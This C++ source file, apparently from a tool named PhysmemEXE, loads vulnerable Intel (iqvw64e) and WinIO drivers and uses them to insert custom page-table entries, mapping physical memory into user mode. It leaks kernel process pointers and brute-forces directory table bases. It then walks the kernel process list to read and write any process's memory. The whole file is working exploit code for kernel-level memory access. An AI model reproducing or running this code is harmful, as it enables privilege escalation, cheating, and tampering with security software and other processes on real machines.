#include "physmem.hpp"

physmem::physmem(uint64_t gb_to_map, HANDLE winio, HANDLE intel)
{
	mapped_pages = gb_to_map;

	wchar_t name[MAX_PATH];
	GetModuleBaseName(GetCurrentProcess(), NULL, name, MAX_PATH);

	local_process_name = std::wstring(name);

	EPROCESS_DATA data = drv_utils::get_eprocess(intel, local_process_name.c_str());

	Log(L"\n");
	Log(L"[*] Inserting " << gb_to_map << " PDPTEs...\n");
	for (int i = 0; i < gb_to_map; i++)
	{
		uintptr_t huge_page_virt = winio_driver::insert_custom_pdpte(winio, i, data.directory_table);
		pdpt_page_table[i] = huge_page_virt;
	}
	Log(L"[+] Inserted " << gb_to_map << " PDPTEs!\n");
	Log(L"\n");

	get_eprocess_offsets();
}

uintptr_t physmem::get_local_virt_from_phys(uintptr_t phys)
{
	uint64_t page = std::floor(phys / 0x40000000);

	if (page >= mapped_pages)
		return 0;

	uintptr_t local_virt = pdpt_page_table[page];
	uint64_t offset = phys - (page * 0x40000000);
	if (offset < 0)
		return 0;

	return local_virt + offset;
}

bool physmem::read_physical_memory(uintptr_t phys, byte* buf, size_t size)
{
	if (size > 0x40000000)
		return false;

	uintptr_t local_virt = get_local_virt_from_phys(phys);
	if (local_virt == 0)
		return false;

	memcpy(buf, (void*)local_virt, size);

	return true;
}

bool physmem::write_physical_memory(uintptr_t phys, byte* buf, size_t size)
{
	if (size > 0x40000000)
		return false;

	uintptr_t local_virt = get_local_virt_from_phys(phys);	
	if (local_virt == 0)
		return false;

	memcpy((void*)local_virt, buf, size);

	return true;
}

uintptr_t physmem::convert_virtual_to_physical(uintptr_t virtual_address)
{
	if (!attached_dtb)
		return 0;

	attached_dtb = attached_dtb & ~0xf;

	uintptr_t va = virtual_address;

	unsigned short pml4_ind = (unsigned short)((va >> 39) & 0x1FF);
	PML4E pml4e;
	if (!read_physical_memory((attached_dtb + pml4_ind * sizeof(uintptr_t)), (byte*)&pml4e, sizeof(pml4e)))
		return 0;

	if (pml4e.Present == 0 || pml4e.PageSize)
		return 0;

	unsigned short pdpt_ind = (unsigned short)((va >> 30) & 0x1FF);
	PDPTE pdpte;
	if (!read_physical_memory(((pml4e.Value & 0xFFFFFFFFFF000) + pdpt_ind * sizeof(uintptr_t)), (byte*)&pdpte, sizeof(pdpte)))
		return 0;

	if (pdpte.Present == 0)
		return 0;

	if (pdpte.PageSize)
		return (pdpte.Value & 0xFFFFFC0000000) + (va & 0x3FFFFFFF);

	unsigned short pd_ind = (unsigned short)((va >> 21) & 0x1FF);
	PDE pde;
	if (!read_physical_memory(((pdpte.Value & 0xFFFFFFFFFF000) + pd_ind * sizeof(uintptr_t)), (byte*)&pde, sizeof(pde)))
		return 0;

	if (pde.Present == 0)
		return 0;

	if (pde.PageSize)
	{
		return (pde.Value & 0xFFFFFFFE00000) + (va & 0x1FFFFF);
	}

	unsigned short pt_ind = (unsigned short)((va >> 12) & 0x1FF);
	PTE pte;
	if (!read_physical_memory(((pde.Value & 0xFFFFFFFFFF000) + pt_ind * sizeof(uintptr_t)), (byte*)&pte, sizeof(pte)))
		return 0;

	if (pte.Present == 0)
		return 0;

	return (pte.Value & 0xFFFFFFFFFF000) + (va & 0xFFF);
}

bool physmem::read_virtual_memory(uintptr_t virt, byte* buf, size_t size)
{
	uintptr_t phys = convert_virtual_to_physical(virt);
	if (!phys)
		return false;

	return read_physical_memory(phys, buf, size);
}

bool physmem::write_virtual_memory(uintptr_t virt, byte* buf, size_t size)
{
	uintptr_t phys = convert_virtual_to_physical(virt);
	if (!phys)
		return false;

	return write_physical_memory(phys, buf, size);
}

uint64_t physmem::find_self_referencing_pml4e()
{
	auto dirbase = get_system_dirbase();

	for (int i = 1; i < 512; i++)
	{
		PML4E pml4e;
		if (!read_physical_memory((dirbase + i * sizeof(uintptr_t)), (byte*) & pml4e, sizeof(pml4e)))
		{
			return 0;
		}

		if (pml4e.Present && pml4e.PageFrameNumber * 0x1000 == dirbase)
		{
			return i;
		}
	}

	return 0;
}

uintptr_t physmem::bruteforce_dtb_from_base(uintptr_t base)
{
	uintptr_t old_attached_dtb = attached_dtb;
	uint64_t self_ref_entry = find_self_referencing_pml4e();
	if (self_ref_entry == 0)
		return 0;

	for (std::uintptr_t dtb = 0x1000000000; dtb != 0x100000; dtb -= 0x1000)
	{
		PML4E pml4e;
		if (!read_physical_memory((dtb + (self_ref_entry * sizeof(uintptr_t))), (byte*) & pml4e, sizeof(pml4e)))
			continue;

		if (!pml4e.Present || pml4e.PageFrameNumber * 0x1000 != dtb)
			continue;

		short mz_bytes;
		attached_dtb = dtb;

		if (!read_virtual_memory(base, (byte*)&mz_bytes, sizeof(mz_bytes)))
		{
			attached_dtb = old_attached_dtb;
			continue;
		}

		if (mz_bytes == 0x5A4D)
		{
			return dtb;
		}
		attached_dtb = old_attached_dtb;
	}
	return 0;
}

uintptr_t physmem::get_system_dirbase()
{
	for (int i = 0; i < 10; i++)
	{
		winio_driver::winio_mem mem;
		static uint8_t* lpBuffer = (uint8_t*)malloc(0x10000);
		RtlZeroMemory(lpBuffer, 0x10000);

		read_physical_memory(i * 0x10000, lpBuffer, 0x10000);

		for (int uOffset = 0; uOffset < 0x10000; uOffset += 0x1000)
		{
			if (0x00000001000600E9 ^ (0xffffffffffff00ff & *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset)))
				continue;
			if (0xfffff80000000000 ^ (0xfffff80000000000 & *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset + 0x70)))
				continue;
			if (0xffffff0000000fff & *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset + 0xa0))
				continue;

			return *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset + 0xa0) & ~0xF;
		}
	}

	return NULL;
}

void physmem::get_eprocess_offsets()
{
	NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);
	OSVERSIONINFOEXW osInfo;

	*(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"),
		"RtlGetVersion");

	DWORD build = 0;

	if (NULL != RtlGetVersion)
	{
		osInfo.dwOSVersionInfoSize = sizeof(osInfo);
		RtlGetVersion(&osInfo);
		build = osInfo.dwBuildNumber;
	}

	switch (build)
	{
	case 22631: //WIN11
		EP_UNIQUEPROCESSID = 0x440;
		EP_ACTIVEPROCESSLINK = 0x448;
		EP_VIRTUALSIZE = 0x498;
		EP_SECTIONBASE = 0x520;
		EP_IMAGEFILENAME = 0x5a8;
		EP_PEB = 0x550;
		EP_VADROOT = 0x7d8;
		break;
	case 22000: //WIN11
		EP_UNIQUEPROCESSID = 0x440;
		EP_ACTIVEPROCESSLINK = 0x448;
		EP_VIRTUALSIZE = 0x498;
		EP_SECTIONBASE = 0x520;
		EP_IMAGEFILENAME = 0x5a8;
		EP_PEB = 0x550;
		EP_VADROOT = 0x7d8;
		break;
	case 19045: // WIN10_22H2
		EP_UNIQUEPROCESSID = 0x440;
		EP_ACTIVEPROCESSLINK = 0x448;
		EP_VIRTUALSIZE = 0x498;
		EP_SECTIONBASE = 0x520;
		EP_IMAGEFILENAME = 0x5a8;
		EP_PEB = 0x550;
		EP_VADROOT = 0x7d8;
		break;
	case 19044: //WIN10_21H2
		EP_UNIQUEPROCESSID = 0x440;
		EP_ACTIVEPROCESSLINK = 0x448;
		EP_VIRTUALSIZE = 0x498;
		EP_SECTIONBASE = 0x520;
		EP_IMAGEFILENAME = 0x5a8;
		EP_PEB = 0x550;
		EP_VADROOT = 0x7d8;
		break;
	case 19043: //WIN10_21H1
		EP_UNIQUEPROCESSID = 0x440;
		EP_ACTIVEPROCESSLINK = 0x448;
		EP_VIRTUALSIZE = 0x498;
		EP_SECTIONBASE = 0x520;
		EP_IMAGEFILENAME = 0x5a8;
		EP_PEB = 0x550;
		EP_VADROOT = 0x7d8;
		break;
	case 19042: //WIN10_20H2
		EP_UNIQUEPROCESSID = 0x440;
		EP_ACTIVEPROCESSLINK = 0x448;
		EP_VIRTUALSIZE = 0x498;
		EP_SECTIONBASE = 0x520;
		EP_IMAGEFILENAME = 0x5a8;
		EP_PEB = 0x550;
		EP_VADROOT = 0x7d8;
		break;
	case 19041: //WIN10_20H1
		EP_UNIQUEPROCESSID = 0x440;
		EP_ACTIVEPROCESSLINK = 0x448;
		EP_VIRTUALSIZE = 0x498;
		EP_SECTIONBASE = 0x520;
		EP_IMAGEFILENAME = 0x5a8;
		EP_PEB = 0x550;
		EP_VADROOT = 0x7d8;
		break;
	case 18363: //WIN10_19H2
		EP_UNIQUEPROCESSID = 0x2e8;
		EP_ACTIVEPROCESSLINK = 0x2f0;
		EP_VIRTUALSIZE = 0x340;
		EP_SECTIONBASE = 0x3c8;
		EP_IMAGEFILENAME = 0x450;
		EP_PEB = 0x3f8;
		EP_VADROOT = 0x658;
		break;
	case 18362: //WIN10_19H1
		EP_UNIQUEPROCESSID = 0x2e8;
		EP_ACTIVEPROCESSLINK = 0x2f0;
		EP_VIRTUALSIZE = 0x340;
		EP_SECTIONBASE = 0x3c8;
		EP_IMAGEFILENAME = 0x450;
		EP_VADROOT = 0x658;
		break;
	case 17763: //WIN10_RS5
		EP_UNIQUEPROCESSID = 0x2e0;
		EP_ACTIVEPROCESSLINK = 0x2e8;
		EP_VIRTUALSIZE = 0x338;
		EP_SECTIONBASE = 0x3c0;
		EP_IMAGEFILENAME = 0x450;
		EP_PEB = 0x3f8;
		EP_VADROOT = 0x628;
		break;
	case 17134: //WIN10_RS4
		EP_UNIQUEPROCESSID = 0x2e0;
		EP_ACTIVEPROCESSLINK = 0x2e8;
		EP_VIRTUALSIZE = 0x338;
		EP_SECTIONBASE = 0x3c0;
		EP_IMAGEFILENAME = 0x450;
		EP_PEB = 0x3f8;
		EP_VADROOT = 0x628;
		break;
	case 16299: //WIN10_RS3
		EP_UNIQUEPROCESSID = 0x2e0;
		EP_ACTIVEPROCESSLINK = 0x2e8;
		EP_VIRTUALSIZE = 0x338;
		EP_SECTIONBASE = 0x3c0;
		EP_IMAGEFILENAME = 0x450;
		EP_PEB = 0x3f8;
		EP_VADROOT = 0x628;
		break;
	case 15063: //WIN10_RS2
		EP_UNIQUEPROCESSID = 0x2e0;
		EP_ACTIVEPROCESSLINK = 0x2e8;
		EP_VIRTUALSIZE = 0x338;
		EP_SECTIONBASE = 0x3c0;
		EP_IMAGEFILENAME = 0x450;
		EP_PEB = 0x3f8;
		EP_VADROOT = 0x628;
		break;
	case 14393: //WIN10_RS1
		EP_UNIQUEPROCESSID = 0x2e8;
		EP_ACTIVEPROCESSLINK = 0x2f0;
		EP_VIRTUALSIZE = 0x338;
		EP_SECTIONBASE = 0x3c0;
		EP_IMAGEFILENAME = 0x450;
		EP_PEB = 0x3f8;
		EP_VADROOT = 0x620;
		break;
	default:
		Log(L"[-] Unrecognized Windows version...\n");
		system("pause");
		exit(0);
		break;
	}
}

bool physmem::leak_kpointers(std::vector<uintptr_t>& pointers)
{
	const unsigned long SystemExtendedHandleInformation = 0x40;

	unsigned long buffer_length = 0;
	unsigned char tempbuffer[1024] = { 0 };
	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation), &tempbuffer, sizeof(tempbuffer), &buffer_length);

	buffer_length += 50 * (sizeof(SYSTEM_HANDLE_INFORMATION_EX) + sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));

	PVOID buffer = VirtualAlloc(nullptr, buffer_length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	RtlSecureZeroMemory(buffer, buffer_length);

	unsigned long buffer_length_correct = 0;
	status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation), buffer, buffer_length, &buffer_length_correct);

	SYSTEM_HANDLE_INFORMATION_EX* handle_information = reinterpret_cast<SYSTEM_HANDLE_INFORMATION_EX*>(buffer);

	for (unsigned int i = 0; i < handle_information->NumberOfHandles; i++)
	{
		const unsigned int SystemUniqueReserved = 4;
		const unsigned int SystemKProcessHandleAttributes = 0x102A;

		if (handle_information->Handles[i].UniqueProcessId == SystemUniqueReserved &&
			handle_information->Handles[i].HandleAttributes == SystemKProcessHandleAttributes)
		{
			pointers.push_back(reinterpret_cast<uintptr_t>(handle_information->Handles[i].Object));
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);
	return true;
}

uintptr_t physmem::leak_kprocess()
{
	std::vector<uintptr_t> pointers;

	if (!leak_kpointers(pointers))
	{
		return NULL;
	}

	const unsigned int sanity_check = 0x3;

	for (uintptr_t pointer : pointers)
	{
		unsigned int check = 0;

		read_virtual_memory(pointer, (byte*) & check, sizeof(unsigned int));

		if (check == sanity_check)
		{
			return pointer;
			break;
		}
	}

	return NULL;
}

EPROCESS_DATA physmem::attach(std::wstring proc_name)
{
	attached_dtb = get_system_dirbase();

	if (!attached_dtb)
	{
		return EPROCESS_DATA{};
	}

	uintptr_t kprocess_initial = leak_kprocess();

	if (!kprocess_initial)
	{
		return EPROCESS_DATA{};
	}

	Log(L"[*] KPROCESS: " << std::hex << kprocess_initial << std::endl);

	const unsigned long limit = 400;

	uintptr_t link_start = kprocess_initial + EP_ACTIVEPROCESSLINK;
	uintptr_t flink = link_start;

	DWORD pid = utils::GetProcessId(proc_name);

	for (int a = 0; a < limit; a++)
	{
		read_virtual_memory(flink, (byte*) & flink, sizeof(flink));

		uintptr_t kprocess = flink - EP_ACTIVEPROCESSLINK;
		uintptr_t virtual_size;
		read_virtual_memory(kprocess + EP_VIRTUALSIZE, (byte*) & virtual_size, sizeof(virtual_size));

		if (virtual_size == 0)
			continue;

		uintptr_t directory_table;
		read_virtual_memory(kprocess + EP_DIRECTORYTABLE, (byte*) & directory_table, sizeof(directory_table));

		int process_id = 0;
		read_virtual_memory(kprocess + EP_UNIQUEPROCESSID, (byte*) & process_id, sizeof(process_id));

		char name[16] = { };
		read_virtual_memory(kprocess + EP_IMAGEFILENAME, (byte*) & name, sizeof(name));

		uintptr_t base_address;
		read_virtual_memory(kprocess + EP_SECTIONBASE, (byte*) & base_address, sizeof(base_address));

		if (process_id == pid)
		{
			EPROCESS_DATA data;
			data.kprocess = kprocess;
			data.directory_table = directory_table & ~0xF;
			data.base = base_address;
			data.pid = process_id;

			attached_dtb = data.directory_table;
			attached_kproc = kprocess;
			Log(L"[*] Attached to DTB: " << std::hex << attached_dtb << std::endl);

			return data;
		}
	}
	return EPROCESS_DATA{};
}

EPROCESS_DATA physmem::attach(DWORD pid)
{
	attached_dtb = get_system_dirbase();

	if (!attached_dtb)
	{
		return EPROCESS_DATA{};
	}

	uintptr_t kprocess_initial = leak_kprocess();

	if (!kprocess_initial)
	{
		return EPROCESS_DATA{};
	}

	Log(L"[*] KPROCESS: " << std::hex << kprocess_initial << std::endl);

	const unsigned long limit = 400;

	uintptr_t link_start = kprocess_initial + EP_ACTIVEPROCESSLINK;
	uintptr_t flink = link_start;

	for (int a = 0; a < limit; a++)
	{
		read_virtual_memory(flink, (byte*)&flink, sizeof(flink));

		uintptr_t kprocess = flink - EP_ACTIVEPROCESSLINK;
		uintptr_t virtual_size;
		read_virtual_memory(kprocess + EP_VIRTUALSIZE, (byte*)&virtual_size, sizeof(virtual_size));

		if (virtual_size == 0)
			continue;

		uintptr_t directory_table;
		read_virtual_memory(kprocess + EP_DIRECTORYTABLE, (byte*)&directory_table, sizeof(directory_table));

		int process_id = 0;
		read_virtual_memory(kprocess + EP_UNIQUEPROCESSID, (byte*)&process_id, sizeof(process_id));

		char name[16] = { };
		read_virtual_memory(kprocess + EP_IMAGEFILENAME, (byte*)&name, sizeof(name));

		uintptr_t base_address;
		read_virtual_memory(kprocess + EP_SECTIONBASE, (byte*)&base_address, sizeof(base_address));

		if (process_id == pid)
		{
			EPROCESS_DATA data;
			data.kprocess = kprocess;
			data.directory_table = directory_table & ~0xF;
			data.base = base_address;
			data.pid = process_id;

			attached_dtb = data.directory_table;
			attached_kproc = kprocess;
			Log(L"[*] Attached to DTB: " << std::hex << attached_dtb << std::endl);

			return data;
		}
	}
	return EPROCESS_DATA{};
}

uintptr_t physmem::get_module_base(std::wstring module_name)
{
	get_eprocess_offsets();
	uintptr_t peb;
	read_virtual_memory(attached_kproc + EP_PEB, (uint8_t*)&peb, sizeof(uintptr_t));

	uintptr_t pldr;
	read_virtual_memory(peb + 0x18, (uint8_t*)&pldr, sizeof(uintptr_t));

	_PEB_LDR_DATA ldr;
	read_virtual_memory(pldr, (uint8_t*)&ldr, sizeof(ldr));

	int limit = 0x100;
	LIST_ENTRY head = ldr.InMemoryOrderModuleList;
	LIST_ENTRY flink = head;

	while (limit)
	{
		limit--;

		nt::_LDR_DATA_TABLE_ENTRY* pmodule = CONTAINING_RECORD(flink.Flink, nt::_LDR_DATA_TABLE_ENTRY, nt::LDR_DATA_TABLE_ENTRY::InMemoryOrderLinks);

		nt::_LDR_DATA_TABLE_ENTRY mod;
		read_virtual_memory((uintptr_t)pmodule, (uint8_t*)&mod, sizeof(mod));
		PWCHAR str = (PWCHAR)malloc(mod.BaseDllName.Length + 2);
		if (!str)
			goto exit;

		memset(str, 0, mod.BaseDllName.Length + 2);

		if (!read_virtual_memory((uintptr_t)mod.BaseDllName.Buffer, (uint8_t*)str, mod.BaseDllName.Length))
			goto exit;

		if (_wcsicmp(module_name.c_str(), str) == 0)
		{
			free(str);
			return (uintptr_t)mod.DllBase;
		}

	exit:
		free(str);
		read_virtual_memory((uintptr_t)flink.Flink, (uint8_t*)&flink, sizeof(LIST_ENTRY));
	}

	return 0;
}


physmem physmem_setup::setup(bool* status, int pages_to_map)
{
	iqvw64e_device_handle = intel_driver::Load();
	if (iqvw64e_device_handle == INVALID_HANDLE_VALUE)
	{
		*status = false;
		return physmem();
	}

	winio_device_handle = winio_driver::Load(iqvw64e_device_handle);
	if (winio_device_handle == INVALID_HANDLE_VALUE)
	{
		*status = false;
		return physmem();
	}

	physmem physmem(pages_to_map, winio_device_handle, iqvw64e_device_handle);

	if (!intel_driver::Unload(iqvw64e_device_handle)) {
		Log(L"[-] Warning failed to fully unload vulnerable driver " << std::endl);
	}
	if (!winio_driver::Unload(winio_device_handle)) {
		Log(L"[-] Warning failed to fully unload vulnerable driver " << std::endl);
	}

	Log(L"[+] PhysmemEXE initialized :)\n\n");

	*status = true;
	return physmem;
}